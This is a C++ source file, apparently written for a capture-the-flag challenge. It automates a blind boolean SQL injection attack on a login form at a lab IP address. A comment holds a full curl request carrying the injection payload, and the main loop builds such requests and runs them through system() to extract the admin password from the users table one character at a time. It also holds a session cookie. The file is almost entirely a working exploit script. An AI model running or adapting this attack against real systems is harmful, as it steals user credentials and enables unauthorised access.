// TODO: implement binary search, use only C
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <sstream>
using namespace std;

// url: http://10.10.145.231:5000/challenge3/login
// curl 'http://10.10.145.231:5000/challenge3/login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.10.145.231:5000' -H 'Connection: keep-alive' -H 'Referer: http://10.10.145.231:5000/challenge3/login' -H 'Cookie: session=.eJyrVkrOSMzJSc1LTzWOLy1OLYrPTFGyMtRBF85LzE1VslIKzcvOL89TqgUALP8TzQ.YKU-1g.M22t8a5VPCgRrU2jOXvBVJYLELw' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'username=admin%27+AND+SUBSTR%28%28SELECT+password+FROM+users+LIMIT+0%2C1%29%2C1%2C1%29+%3D+CAST%28X%2754%27+as+Text%29--+-&password=fds'
int main(void) {
    char *req[3] = {"curl 'http://10.10.145.231:5000/challenge3/login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.10.145.231:5000' -H 'Connection: keep-alive' -H 'Referer: http://10.10.145.231:5000/challenge3/login' -H 'Cookie: session=.eJyrVkrOSMzJSc1LTzWOLy1OLYrPTFGyMtRBF85LzE1VslIKzcvOL89TqgUALP8TzQ.YKU-1g.M22t8a5VPCgRrU2jOXvBVJYLELw' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'username=admin%27+AND+SUBSTR%28%28SELECT+password+FROM+users+LIMIT+0%2C1%29%2C", // + position in string
                    "%2C1%29+%3D+CAST%28X%27", // + ASCII character in hex
                    "%27+as+Text%29--+-&password=fds' 2> /dev/null | grep Redirecting > error.out"};

    char ans[38] = {};
    
    int i, j;
    for (i = 1; i < sizeof ans; i++) {
        char request[1024] = {};
        strcat(request, req[0]);

        char car[4];
        strcpy(car, to_string(i).c_str());
        
        strcat(request, car);
        strcat(request, req[1]);

        bool found = 0;
        for (j = 0; j < 128 && !found; j++) { // TODO: implement binary search
            char Request[1024];
            memcpy(Request, request, 1024);

            stringstream ss;
            ss << hex << j;
            strcat(Request, ss.str().c_str());
            
            strcat(Request, req[2]);
            system(Request);
            
            if (fgetc(fopen("error.out", "r")) != -1) {
                found = 1;
                printf("%c\n", j);
            }
        }
    }

    return 0;
}
